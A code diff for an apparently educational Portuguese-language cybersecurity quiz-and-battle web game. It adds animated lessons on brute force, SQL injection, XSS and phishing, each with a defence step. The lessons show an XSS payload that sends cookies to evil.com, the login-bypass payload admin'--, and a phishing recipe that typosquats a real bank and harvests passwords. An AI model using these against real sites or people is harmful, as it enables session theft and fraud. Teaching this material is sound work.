-      <span style="font-family:var(--mono);font-size:0.72rem;color:var(--text);">👤 ${playerName}</span>
-    </div>`;
+// QUIZ
+function initQuizUI(){
+  showPage('p-quiz');
+  const b=document.getElementById('q-badge');
+  if(b){b.textContent=pTeam==='red'?'🔴 VERMELHA':'🔵 AZUL';b.className='badge '+(pTeam==='red'?'red':'blue');}
+  const pn=document.getElementById('q-pname');if(pn)pn.textContent=pName;
 }
 
-function loadQuestion(qi, startedAt) {
-  if (qi === currentQ && answered) return;
-  currentQ = qi; answered = false; selectedOpt = null;
-  const q = QUESTIONS[qi];
-  document.getElementById('q-counter').textContent = `PERGUNTA ${qi+1} DE 25`;
-  document.getElementById('q-text').textContent = q.q;
-  document.getElementById('hint-box').style.display='none';
-  document.getElementById('hint-box').textContent = q.hint;
-  document.getElementById('btn-hint').textContent = '[ VER DICA ]';
-  document.getElementById('btn-send').disabled = true;
-  const opts = document.getElementById('q-options');
-  opts.innerHTML = '';
-  q.opts.forEach((o,i) => {
-    const btn = document.createElement('button');
-    btn.className='opt-btn';
-    btn.innerHTML=`<span class="opt-letter">${String.fromCharCode(65+i)}</span>${o}`;
-    btn.onclick=()=>selectOption(i);
-    opts.appendChild(btn);
-  });
-  let elapsed = 0;
-  if (startedAt && startedAt.toMillis) elapsed = Math.floor((Date.now()-startedAt.toMillis())/1000);
-  timeLeft = Math.max(0, 120-elapsed);
-  questionStartTime = Date.now() - elapsed*1000;
-  startTimer();
-}
-
-function selectOption(i) {
-  if (answered) return;
-  selectedOpt = i;
-  document.querySelectorAll('.opt-btn').forEach((b,idx) => {
-    b.className = 'opt-btn' + (idx===i?' selected':'');
-  });
-  document.getElementById('btn-send').disabled = false;
-}
-
-function startTimer() {
-  clearInterval(timerInterval);
-  updateTimerUI();
-  timerInterval = setInterval(() => {
-    timeLeft--;
-    updateTimerUI();
-    if (timeLeft<=0) { clearInterval(timerInterval); if (!answered) autoSkip(); }
-  }, 1000);
-}
-
-function updateTimerUI() {
-  const m=Math.floor(timeLeft/60), s=timeLeft%60;
-  document.getElementById('timer-disp').textContent = m+':'+(s<10?'0':'')+s;
-  const c = document.getElementById('timer-circle');
-  if (timeLeft<=30) c.classList.add('urgent'); else c.classList.remove('urgent');
-}
-
-function autoSkip() {
-  if (answered) return;
-  answered = true;
-  document.getElementById('btn-send').disabled=true;
-  document.querySelectorAll('.opt-btn').forEach(b=>b.disabled=true);
-  recordAnswer(null, 0);
-}
-
-window.submitAnswer = async function() {
-  if (answered || selectedOpt===null) return;
-  answered = true;
-  clearInterval(timerInterval);
-  const timeTaken = 120-timeLeft;
-  document.querySelectorAll('.opt-btn').forEach(b=>b.disabled=true);
-  document.getElementById('btn-send').disabled=true;
-  await recordAnswer(selectedOpt, timeTaken);
-};
-
-async function recordAnswer(opt, timeTaken) {
-  const q = QUESTIONS[currentQ];
-  const isCorrect = opt!==null && opt===q.correct;
-  try {
-    await setDoc(doc(db,'answers', playerId+'_q'+currentQ), {
-      playerId, playerName, team: playerTeam,
-      questionIndex: currentQ,
-      answer: opt, correct: isCorrect, timeTaken,
-      answeredAt: serverTimestamp()
+function loadQ(qi,startedAt){
+  if(qi===curQ&&answered)return;
+  curQ=qi;answered=false;selOpt=null;
+  const q=QUESTIONS[qi];
+  const qc=document.getElementById('q-counter');if(qc)qc.textContent='QUESTÃO '+(qi+1)+' DE 25';
+  const qt=document.getElementById('q-text');if(qt)qt.textContent=q.q;
+  const hb=document.getElementById('hint-box');if(hb){hb.style.display='none';hb.textContent=q.hint;}
+  const bh=document.getElementById('btn-hint');if(bh)bh.textContent='[ VER DICA ]';
+  const bs=document.getElementById('btn-send');if(bs)bs.disabled=true;
+  const opts=document.getElementById('q-options');
+  if(opts){
+    opts.innerHTML='';
+    q.opts.forEach((o,i)=>{
+      const btn=document.createElement('button');
+      btn.className='opt-btn';
+      btn.innerHTML=`<span class="opt-letter">${String.fromCharCode(65+i)}</span>${o}`;
+      btn.onclick=()=>selQ(i);
+      opts.appendChild(btn);
     });
-  } catch(e) { console.error(e); }
+  }
+  let elapsed=0;
+  if(startedAt&&startedAt.toMillis)elapsed=Math.floor((Date.now()-startedAt.toMillis())/1000);
+  qTime=Math.max(0,120-elapsed);
+  startQTmr();
 }
 
-window.toggleHint = function() {
-  const box = document.getElementById('hint-box');
-  const btn = document.getElementById('btn-hint');
-  const show = box.style.display==='none'||!box.style.display;
-  box.style.display = show ? 'block' : 'none';
-  btn.textContent = show ? '[ OCULTAR DICA ]' : '[ VER DICA ]';
+function selQ(i){
+  if(answered)return;
+  selOpt=i;
+  document.querySelectorAll('.opt-btn').forEach((b,idx)=>{b.className='opt-btn'+(idx===i?' selected':'');});
+  const bs=document.getElementById('btn-send');if(bs)bs.disabled=false;
+}
+
+function startQTmr(){
+  clearInterval(qTmr);
+  updateQUI();
+  qTmr=setInterval(()=>{qTime--;updateQUI();if(qTime<=0){clearInterval(qTmr);if(!answered)skipQ();}},1000);
+}
+
+function updateQUI(){
+  const m=Math.floor(qTime/60),s=qTime%60;
+  const td=document.getElementById('timer-disp');if(td)td.textContent=m+':'+(s<10?'0':'')+s;
+  const tc=document.getElementById('timer-circle');
+  if(tc){if(qTime<=30)tc.classList.add('urgent');else tc.classList.remove('urgent');}
+}
+
+function skipQ(){
+  if(answered)return;answered=true;
+  document.querySelectorAll('.opt-btn').forEach(b=>b.disabled=true);
+  const bs=document.getElementById('btn-send');if(bs)bs.disabled=true;
+  saveAnswer(null,0);
+}
+
+window.submitAnswer=async function(){
+  if(answered||selOpt===null)return;
+  answered=true;clearInterval(qTmr);
+  const t=120-qTime;
+  document.querySelectorAll('.opt-btn').forEach(b=>b.disabled=true);
+  const bs=document.getElementById('btn-send');if(bs)bs.disabled=true;
+  await saveAnswer(selOpt,t);
 };
 
-function showResult(data) {
-  const overlay = document.getElementById('result-overlay');
-  const winner = data.questionWinner;
-  overlay.style.display='flex';
-  document.getElementById('res-title').textContent = 'RESULTADO DA QUESTÃO '+(data.lastQuestion+1);
-  document.getElementById('res-sub').textContent = `🔴 Vermelha: ${data.redCorrect||0} acertos | 🔵 Azul: ${data.blueCorrect||0} acertos`;
-  const winEl = document.getElementById('res-winner');
-  const iconEl = document.getElementById('res-icon');
-  if (winner==='red')       { winEl.textContent='🏆 PONTO PARA EQUIPE VERMELHA!'; winEl.className='res-winner red';  iconEl.textContent='🔴'; }
-  else if (winner==='blue') { winEl.textContent='🏆 PONTO PARA EQUIPE AZUL!';     winEl.className='res-winner blue'; iconEl.textContent='🔵'; }
-  else if (winner==='draw') { winEl.textContent='⚡ EMPATE TOTAL — PONTO PARA AMBAS!'; winEl.className='res-winner draw'; iconEl.textContent='⚡'; }
-  else                      { winEl.textContent='✗ NINGUÉM PONTUA — AMBAS ZERARAM!';  winEl.className='res-winner draw'; iconEl.textContent='💀'; }
-  document.getElementById('q-sr').textContent = data.scoreRed||0;
-  document.getElementById('q-sb').textContent = data.scoreBlue||0;
-  setTimeout(() => { overlay.style.display='none'; }, 5000);
+async function saveAnswer(opt,t){
+  const q=QUESTIONS[curQ];
+  const ok=opt!==null&&opt===q.correct;
+  try{await setDoc(doc(db,'answers',pId+'_q'+curQ),{playerId:pId,playerName:pName,team:pTeam,questionIndex:curQ,answer:opt,correct:ok,timeTaken:t,answeredAt:serverTimestamp()});}
+  catch(e){console.error(e);}
 }
 
-function showEnd(data) {
-  clearInterval(timerInterval);
-  document.getElementById('screen-quiz').style.display='none';
-  document.getElementById('result-overlay').style.display='none';
-  document.getElementById('end-screen').style.display='block';
-  document.getElementById('end-sr').textContent = data.scoreRed||0;
-  document.getElementById('end-sb').textContent = data.scoreBlue||0;
+window.toggleHint=function(){
+  const box=document.getElementById('hint-box');
+  const btn=document.getElementById('btn-hint');
+  if(!box||!btn)return;
+  const show=box.style.display==='none'||!box.style.display;
+  box.style.display=show?'block':'none';
+  btn.textContent=show?'[ OCULTAR DICA ]':'[ VER DICA ]';
+};
+
+function showQRes(data){
+  const ov=document.getElementById('result-overlay');
+  if(!ov)return;
+  ov.style.display='flex';
+  const w=data.questionWinner;
+  const rt=document.getElementById('res-title');if(rt)rt.textContent='RESULTADO Q'+(data.lastQuestion+1);
+  const rs=document.getElementById('res-sub');if(rs)rs.textContent='🔴 '+( data.redCorrect||0)+' acertos | 🔵 '+(data.blueCorrect||0)+' acertos';
+  const rw=document.getElementById('res-winner');
+  const ri=document.getElementById('res-icon');
+  if(rw&&ri){
+    if(w==='red'){rw.textContent='🏆 PONTO PARA VERMELHA!';rw.className='res-winner red';ri.textContent='🔴';}
+    else if(w==='blue'){rw.textContent='🏆 PONTO PARA AZUL!';rw.className='res-winner blue';ri.textContent='🔵';}
+    else if(w==='draw'){rw.textContent='⚡ EMPATE — AMBAS PONTUAM!';rw.className='res-winner draw';ri.textContent='⚡';}
+    else{rw.textContent='✗ NINGUÉM PONTUA';rw.className='res-winner draw';ri.textContent='💀';}
+  }
+  const sr=document.getElementById('q-sr');if(sr)sr.textContent=data.scoreRed||0;
+  const sb=document.getElementById('q-sb');if(sb)sb.textContent=data.scoreBlue||0;
+  setTimeout(()=>{ov.style.display='none';},5000);
 }
+
+// BATALHA
+function initBattleUI(){
+  showPage('p-battle');
+  const b=document.getElementById('b-badge');
+  if(b){b.textContent=pTeam==='red'?'🔴 ATAQUE':'🔵 DEFESA';b.className='badge '+(pTeam==='red'?'red':'blue');}
+  const pn=document.getElementById('b-pname');if(pn)pn.textContent=pName;
+  document.getElementById('b-choice-section').style.display='block';
+  document.getElementById('b-voted-section').style.display='none';
+}
+
+function loadRound(ri,startedAt){
+  if(ri===lastRound&&voted)return;
+  if(ri!==lastRound){lastRound=ri;voted=false;myVote=null;}
+  curRound=ri;
+  const sc=SCENARIOS[ri];
+  const sn=document.getElementById('b-sc-name');if(sn)sn.textContent=sc.name;
+  const sx=document.getElementById('b-sc-ctx');if(sx)sx.textContent=sc.ctx;
+  const items=pTeam==='red'?ATK:DEF;
+  const selCls=pTeam==='red'?'sel-red':'sel-blue';
+  const grid=document.getElementById('b-choice-grid');
+  if(grid){
+    grid.innerHTML='';
+    items.forEach(it=>{
+      const btn=document.createElement('button');
+      btn.className='choice-btn';btn.id='cb-'+it.id;
+      btn.innerHTML=`<span class="ch-icon">${it.i}</span>${it.n}<div class="vc" id="vc-${it.id}"></div>`;
+      btn.onclick=()=>selVote(it.id,selCls);
+      grid.appendChild(btn);
+    });
+  }
+  const bs=document.getElementById('b-btn-send');if(bs)bs.disabled=true;
+  document.getElementById('b-choice-section').style.display='block';
+  document.getElementById('b-voted-section').style.display='none';
+  let elapsed=0;
+  if(startedAt&&startedAt.toMillis)elapsed=Math.floor((Date.now()-startedAt.toMillis())/1000);
+  bTime=Math.max(0,90-elapsed);
+  startBTmr();
+}
+
+function selVote(id,cls){
+  if(voted)return;
+  myVote=id;
+  document.querySelectorAll('.choice-btn').forEach(b=>{b.className='choice-btn';});
+  const cb=document.getElementById('cb-'+id);if(cb)cb.classList.add(cls);
+  const bs=document.getElementById('b-btn-send');if(bs)bs.disabled=false;
+}
+
+function startBTmr(){
+  clearInterval(bTmr);updateBUI();
+  bTmr=setInterval(()=>{bTime--;updateBUI();if(bTime<=0){clearInterval(bTmr);if(!voted)autoVote();}},1000);
+}
+
+function updateBUI(){
+  const m=Math.floor(bTime/60),s=bTime%60;
+  const td=document.getElementById('b-td');if(td)td.textContent=m+':'+(s<10?'0':'')+s;
+  const tc=document.getElementById('b-tc');
+  if(tc){if(bTime<=20)tc.classList.add('urgent');else tc.classList.remove('urgent');}
+}
+
+function autoVote(){
+  if(voted)return;voted=true;
+  document.querySelectorAll('.choice-btn').forEach(b=>b.disabled=true);
+  const bs=document.getElementById('b-btn-send');if(bs)bs.disabled=true;
+  document.getElementById('b-choice-section').style.display='none';
+  document.getElementById('b-voted-section').style.display='block';
+}
+
+window.submitVote=async function(){
+  if(voted||!myVote)return;
+  voted=true;clearInterval(bTmr);
+  document.querySelectorAll('.choice-btn').forEach(b=>b.disabled=true);
+  const bs=document.getElementById('b-btn-send');if(bs)bs.disabled=true;
+  try{
+    await setDoc(doc(db,'votes2',pId+'_r'+curRound),{playerId:pId,playerName:pName,team:pTeam,round:curRound,choice:myVote,votedAt:serverTimestamp()});
+    document.getElementById('b-choice-section').style.display='none';
+    document.getElementById('b-voted-section').style.display='block';
+  }catch(e){console.error(e);}
+};
+
+function renderDots(cur,results){
+  const el=document.getElementById('b-dots');
+  if(!el)return;
+  el.innerHTML='';
+  for(let i=0;i<10;i++){
+    const d=document.createElement('div');
+    d.className='rdot'+(i<results.length?' '+results[i]:i===cur?' cur':'');
+    el.appendChild(d);
+  }
+}
+
+function showBRes(data){
+  clearInterval(bTmr);
+  const ov=document.getElementById('result-overlay');
+  if(!ov)return;
+  ov.style.display='flex';
+  const w=data.roundWinner;
+  const rt=document.getElementById('res-title');if(rt)rt.textContent='RESULTADO RODADA '+(data.lastRound+1);
+  const a=ATK.find(x=>x.id===data.attackChoice)||{i:'⚔️',n:data.attackChoice||'?'};
+  const df=DEF.find(x=>x.id===data.defenseChoice)||{i:'🛡️',n:data.defenseChoice||'?'};
+  const rs=document.getElementById('res-sub');if(rs)rs.textContent=a.i+' '+a.n+' vs '+df.i+' '+df.n;
+  const rw=document.getElementById('res-winner');
+  const ri=document.getElementById('res-icon');
+  if(rw&&ri){
+    if(w==='red'){rw.textContent='💥 ATAQUE VENCEU!';rw.className='res-winner red';ri.textContent='🔴';}
+    else if(w==='blue'){rw.textContent='🛡️ DEFESA VENCEU!';rw.className='res-winner blue';ri.textContent='🔵';}
+    else{rw.textContent='⚡ EMPATE TÉCNICO';rw.className='res-winner draw';ri.textContent='⚖️';}
+  }
+  const br=document.getElementById('b-sr');if(br)br.textContent=data.scoreRed||0;
+  const bb=document.getElementById('b-sb');if(bb)bb.textContent=data.scoreBlue||0;
+  setTimeout(()=>{ov.style.display='none';},20000);
+}
+
+
+// ── LAB ALGORITMOS ────────────────────────────────────────
+let curAlgo=null,curStep=0,labTmr=null;
+
+const ALGOS={
+brute:{title:'Brute Force',fname:'brute_force.py',
+code:[{t:'<span class="cm"># Ataque de força bruta</span>'},{t:'<span class="kw">import</span> <span class="var">itertools</span>, <span class="var">string</span>'},{t:''},{t:'<span class="var">TARGET</span> = <span class="str">"5f4dcc3b..."</span>'},{t:'<span class="var">CHARSET</span> = <span class="var">string</span>.<span class="fn">ascii_lowercase</span>+<span class="var">string</span>.<span class="fn">digits</span>'},{t:''},{t:'<span class="cm"># Fase 1 — dicionário</span>'},{t:'<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"rockyou.txt"</span>) <span class="kw">as</span> <span class="var">f</span>:'},{t:'&nbsp;&nbsp;<span class="kw">for</span> <span class="var">w</span> <span class="kw">in</span> <span class="var">f</span>:'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">if</span> <span class="fn">md5</span>(<span class="var">w</span>)==<span class="var">TARGET</span>: <span class="kw">break</span>'},{t:''},{t:'<span class="cm"># Fase 2 — força bruta total</span>'},{t:'<span class="kw">for</span> <span class="var">length</span> <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>,<span class="num">9</span>):'},{t:'&nbsp;&nbsp;<span class="kw">for</span> <span class="var">combo</span> <span class="kw">in</span> <span class="var">itertools</span>.<span class="fn">product</span>(<span class="var">CHARSET</span>,<span class="var">repeat</span>=<span class="var">length</span>):'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">c</span>=<span class="str">""</span>.<span class="fn">join</span>(<span class="var">combo</span>)'},{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">if</span> <span class="fn">md5</span>(<span class="var">c</span>)==<span class="var">TARGET</span>:<span class="fn">print</span>(<span class="var">c</span>)'}],
+steps:[
+{lines:[],hl:'',lbl:'INTRODUÇÃO',cls:'',txt:'Testa todas as combinações possíveis até encontrar a que gera o mesmo hash da senha alvo. Não exige inteligência — apenas tempo e poder computacional.'},
+{lines:[7,8,9,10],hl:'hl-amber',lbl:'FASE 1 — DICIONÁRIO',cls:'warn',txt:'Testa senhas de uma wordlist (rockyou.txt: 14 milhões de senhas). Rápido e eficaz — 80% das senhas fracas estão nessas listas.'},
+{lines:[12,13,14,15,16],hl:'hl-red',lbl:'FASE 2 — COMBINATÓRIA',cls:'danger',txt:'Para 6 chars: 36⁶ = 2.176.782.336 combinações. Com GPU: ~10 bilhões tentativas/s. Senha de 6 chars quebrada em segundos.'},
+{lines:[15,16],hl:'hl-green',lbl:'SENHA ENCONTRADA',cls:'',txt:'Hash bate com o alvo. Cada caractere extra multiplica o tempo exponencialmente — use senhas longas.'},
+{lines:[],hl:'',lbl:'DEFESA',cls:'info',txt:'Senhas longas + 2FA + bloqueio após N tentativas tornam o ataque inviável. Use gerenciador de senhas.'}],
+initV(){document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// CRACKER AO VIVO //</span><div class="pass-wrap"><div class="att-lbl" id="ba">Tentativas: 0</div><div class="pass-disp">${[0,1,2,3,4,5].map(i=>`<span class="pc pc-lock" id="bc${i}">?</span>`).join('')}</div><div class="prog-t"><div class="prog-f" id="bp" style="width:0%;background:var(--red)"></div></div></div><div class="exp-box" id="be"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const e=document.getElementById('be');
+  if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  if(labTmr){clearInterval(labTmr);labTmr=null;}
+  if(s===0){for(let i=0;i<6;i++){const c=document.getElementById('bc'+i);if(c){c.className='pc pc-lock';c.textContent='?';}}const p=document.getElementById('bp');if(p)p.style.width='0%';const a=document.getElementById('ba');if(a)a.textContent='Tentativas: 0';}
+  if(s===2){const T='p4ssw0',CS='abcdefghijklmnopqrstuvwxyz0123456789';let att=0,pos=0;const fd=Array(6).fill(false);
+    labTmr=setInterval(()=>{if(pos>=6){clearInterval(labTmr);return;}att+=Math.floor(Math.random()*900)+100;
+    const a=document.getElementById('ba');if(a)a.textContent='Tentativas: '+att.toLocaleString('pt-BR');
+    const c=document.getElementById('bc'+pos);if(!c)return;
+    if(!fd[pos]){c.className='pc pc-try';c.textContent=CS[Math.floor(Math.random()*CS.length)];
+      if(Math.random()<0.07){c.textContent=T[pos];c.className='pc pc-ok';fd[pos]=true;pos++;}}
+    const p=document.getElementById('bp');if(p)p.style.width=(pos/6*100)+'%';},55);}
+}},
+sqli:{title:'SQL Injection',fname:'sqli.py',
+code:[{t:'<span class="cm"># Login vulnerável</span>'},{t:'<span class="var">user</span>=<span class="fn">input</span>(<span class="str">"usuário:"</span>)'},{t:'<span class="var">passw</span>=<span class="fn">input</span>(<span class="str">"senha:"</span>)'},{t:''},{t:'<span class="cm"># ❌ Concatenação direta</span>'},{t:'<span class="var">q</span>=<span class="str">f"SELECT * FROM users WHERE login='{user}' AND pass='{passw}'"</span>'},{t:''},{t:'<span class="cm"># Payload do atacante:</span>'},{t:'<span class="var">user</span>=<span class="str">"admin'--"</span>  <span class="cm"># fecha string + comenta</span>'},{t:'<span class="cm"># Resultado: WHERE login='admin'-- AND pass='x'</span>'},{t:'<span class="cm"># AND pass ignorado! Login sem senha.</span>'},{t:''},{t:'<span class="cm"># ✅ Prepared Statement</span>'},{t:'<span class="var">cursor</span>.<span class="fn">execute</span>(<span class="str">"...WHERE login=? AND pass=?"</span>,(<span class="var">user</span>,<span class="var">passw</span>))'}],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'Login concatena input diretamente na query SQL — vulnerabilidade clássica ainda muito comum.'},
+{lines:[1,2,5,6],hl:'hl-amber',lbl:'QUERY NORMAL',cls:'warn',txt:'Login legítimo: query verifica login E senha. Funciona normalmente para usuários comuns.'},
+{lines:[8,9],hl:'hl-red',lbl:'PAYLOAD INJETADO',cls:'danger',txt:'Atacante digita admin'-- no campo. O apóstrofo fecha a string prematuramente e -- comenta tudo que vem depois.'},
+{lines:[9,10,11],hl:'hl-red',lbl:'QUERY QUEBRADA',cls:'danger',txt:'WHERE login='admin'-- → verificação de senha ignorada! Banco retorna o usuário sem checar a senha.'},
+{lines:[13,14],hl:'hl-green',lbl:'DEFESA',cls:'info',txt:'Prepared Statements tratam o input como dado puro. O payload admin'-- vira um nome literal inexistente.'}],
+initV(){document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// QUERY AO VIVO //</span><div class="sql-wrap"><span class="sq-n">WHERE login='</span><span id="su" class="sq-s">admin</span><span class="sq-n">' AND pass='</span><span id="sp" class="sq-s">••••</span><span class="sq-n">'</span></div><div class="sql-res" id="sr">Aguardando...</div><div class="exp-box" id="se"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const e=document.getElementById('se');if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  const u=document.getElementById('su'),p=document.getElementById('sp'),r=document.getElementById('sr');if(!u)return;
+  const st=[{u:'admin',p:'••••',r:'Aguardando execução...'},{u:'admin',p:'senhaCorreta',r:'✅ Login autorizado.'},
+    {u:"admin'--",p:'qualquer',r:'⚠️ Montando query maliciosa...'},{u:"admin'--",p:'qualquer',r:'💀 Senha IGNORADA! Admin logado.'},
+    {u:'admin',p:'senhaCorreta',r:'✅ Prepared Statement: injeção impossível.'}];
+  const d=st[s]||st[0];u.textContent=d.u;u.className=s>=2&&s<=3?'sq-i':'sq-s';p.textContent=d.p;p.className=s>=2&&s<=3?'sq-i':'sq-s';r.textContent=d.r;
+  r.style.color=s===3?'var(--red)':s===4?'var(--green)':'var(--text)';
+}},
+xss:{title:'Cross-Site Scripting (XSS)',fname:'xss.js',
+code:[{t:'<span class="cm">// Campo de busca sem sanitização</span>'},{t:''},{t:'<span class="var">payload</span>=<span class="str">`&lt;script&gt;`</span>'},{t:'&nbsp;&nbsp;<span class="kw">var</span> <span class="var">img</span>=<span class="kw">new</span> <span class="fn">Image</span>()'},{t:'&nbsp;&nbsp;<span class="var">img</span>.<span class="var">src</span>=<span class="str">"evil.com?c="</span>+<span class="var">document</span>.<span class="var">cookie</span>'},{t:'<span class="str">`&lt;/script&gt;`</span>'},{t:''},{t:'<span class="cm">// ✅ Defesa</span>'},{t:'<span class="cm">// PHP: htmlspecialchars($in)</span>'},{t:'<span class="cm">// JS: el.textContent=input</span>'},{t:'<span class="cm">// Header: Content-Security-Policy</span>'}],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'Página exibe o termo pesquisado sem sanitização. HTML/JS inserido será renderizado pelo browser de todos os usuários.'},
+{lines:[2,3,4,5,6],hl:'hl-red',lbl:'PAYLOAD',cls:'danger',txt:'Atacante insere tag script no campo. Servidor armazena sem escapar — browser da vítima interpreta como código JS.'},
+{lines:[2,3,4,5,6],hl:'hl-red',lbl:'DOM INFECTADO',cls:'danger',txt:'Script faz parte do DOM. Cada usuário que acessar a página executa o código do atacante no próprio browser.'},
+{lines:[2,3,4,5,6],hl:'hl-red',lbl:'COOKIE CAPTURADO',cls:'danger',txt:'Script envia o cookie de sessão para evil.com. Atacante autentica como a vítima sem precisar da senha.'},
+{lines:[8,9,10,11],hl:'hl-green',lbl:'DEFESA',cls:'info',txt:'Nunca use innerHTML com input do usuário. Use textContent ou htmlspecialchars(). CSP bloqueia scripts não autorizados.'}],
+initV(){document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// DOM //</span><div class="dom-wrap"><span class="dn">&lt;html&gt;</span><span class="dn dn-i1">&lt;body&gt;</span><span class="dn dn-i2">&lt;h1&gt;Resultados: "gato"&lt;/h1&gt;</span><span class="dn dn-i2" id="xn">&lt;p&gt;3 resultados&lt;/p&gt;</span><span class="dn dn-i1">&lt;/body&gt;</span><span class="dn">&lt;/html&gt;</span></div><div class="ck-box" id="xck" style="display:none">🍪 Cookie capturado</div><div class="exp-box" id="xe"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const e=document.getElementById('xe');if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  const n=document.getElementById('xn'),ck=document.getElementById('xck');if(!n)return;
+  if(s===0){n.textContent='<p>3 resultados</p>';n.className='dn dn-i2';if(ck)ck.style.display='none';}
+  if(s===1){n.textContent='<input value="<scr'+'ipt>...</scr'+'ipt>">';n.className='dn dn-i2';}
+  if(s===2){n.textContent='<scr'+'ipt>img.src="evil?c="+cookie</scr'+'ipt>';n.className='dn dn-i2 dn-inj';}
+  if(s===3&&ck){ck.style.display='block';ck.textContent='🍪 sessionid=a3f9b2c1 → evil.com/steal';}
+  if(s===4){n.textContent='<p>3 resultados</p>';n.className='dn dn-i2';if(ck)ck.style.display='none';}
+}},
+phish:{title:'Phishing & URL Spoofing',fname:'phish.py',
+code:[{t:'<span class="cm"># 1. Typosquatting</span>'},{t:'<span class="var">fake</span>=<span class="str">"bradesc0.com.br"</span> <span class="cm"># o→0</span>'},{t:''},{t:'<span class="cm"># 2. Clonar página</span>'},{t:'<span class="var">html</span>=<span class="fn">requests</span>.<span class="fn">get</span>(<span class="var">real</span>).<span class="var">text</span>'},{t:'<span class="var">html</span>=<span class="var">html</span>.<span class="fn">replace</span>(<span class="str">'action="/"'</span>,<span class="str">f'action="{fake}"'</span>)'},{t:''},{t:'<span class="cm"># 3. E-mail de urgência</span>'},{t:'<span class="var">email</span>={'},{t:'&nbsp;&nbsp;<span class="str">"from"</span>:<span class="str">"seguranca@bradesc0.com.br"</span>,'},{t:'&nbsp;&nbsp;<span class="str">"subject"</span>:<span class="str">"⚠️ CONTA BLOQUEADA — 24h"</span>'},{t:'}'},{t:''},{t:'<span class="cm"># 4. Capturar credenciais</span>'},{t:'<span class="kw">def</span> <span class="fn">harvest</span>(<span class="var">req</span>):<span class="var">log</span>.<span class="fn">write</span>(<span class="var">req</span>.<span class="var">form</span>[<span class="str">"password"</span>])'}],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'Phishing combina falsificação técnica com manipulação psicológica. Cada elemento elimina a desconfiança da vítima.'},
+{lines:[1,2],hl:'hl-amber',lbl:'TYPOSQUATTING',cls:'warn',txt:'URL muda apenas um char: bradesc0 (zero no lugar do o). O olho humano não percebe, especialmente sob pressão.'},
+{lines:[4,5,6],hl:'hl-amber',lbl:'CLONE DA PÁGINA',cls:'warn',txt:'HTML do site real é baixado e só o action do formulário é trocado. Vítima vê página idêntica à original.'},
+{lines:[8,9,10,11,12],hl:'hl-red',lbl:'E-MAIL ARMADO',cls:'danger',txt:'Urgência (24h), ameaça (bloqueio) eliminam o pensamento racional. Cérebro em pânico age por impulso.'},
+{lines:[14,15],hl:'hl-green',lbl:'DEFESA',cls:'info',txt:'Passe o mouse sobre links antes de clicar. Bancos NUNCA pedem senha por e-mail. Em dúvida: acesse digitando o endereço.'}],
+initV(){document.getElementById('algo-vis').innerHTML=`<span class="vis-lbl">// E-MAIL //</span><div class="em-wrap"><div class="em-hdr"><div class="ef"><span class="ef-l">DE:</span><span class="ef-v" id="pf">seguranca@banco.com.br</span></div><div class="ef"><span class="ef-l">ASSUNTO:</span><span class="ef-v" id="ps">Aviso</span></div></div><div class="em-body" id="pb">Prezado cliente.<br><span id="pl"><a class="elink" href="#">Acesse sua conta</a></span></div></div><div class="exp-box" id="pe"><span class="exp-lbl">AGUARDANDO</span>Clique ▶ para iniciar.</div>`;},
+updV(s){
+  const e=document.getElementById('pe');if(e){e.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');e.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+  const f=document.getElementById('pf'),sj=document.getElementById('ps'),bd=document.getElementById('pb'),lk=document.getElementById('pl');if(!f)return;
+  const st=[{f:'seguranca@banco.com.br',fc:'ef-v',s:'Aviso',b:'Prezado cliente.<br>',l:'<a class="elink" href="#">Acesse sua conta</a>'},
+    {f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'Aviso',b:'Prezado cliente.<br>',l:'<a class="elink" href="#">Acesse sua conta</a>'},
+    {f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'Aviso',b:'Acesse:<br>',l:'<a class="elink-fake" href="#">bradesco.com.br.login-seguro.tk</a>'},
+    {f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'⚠️ CONTA BLOQUEADA — 24h!',b:'Conta <strong style="color:var(--red)">BLOQUEADA</strong>. Regularize em <strong style="color:var(--red)">24h</strong>.<br>',l:'<a class="elink-fake" href="#">🔗 Regularizar agora</a>'},
+    {f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'⚠️ CONTA BLOQUEADA',b:'<span style="color:#4a6a8a">↑ Phishing. Nunca clique!</span>',l:''}];
+  const d=st[s]||st[0];f.textContent=d.f;f.className=d.fc;sj.textContent=d.s;bd.innerHTML=d.b;lk.innerHTML=d.l;
+}},
+buffer:{title:'Buffer Overflow',fname:'buffer_overflow.c',
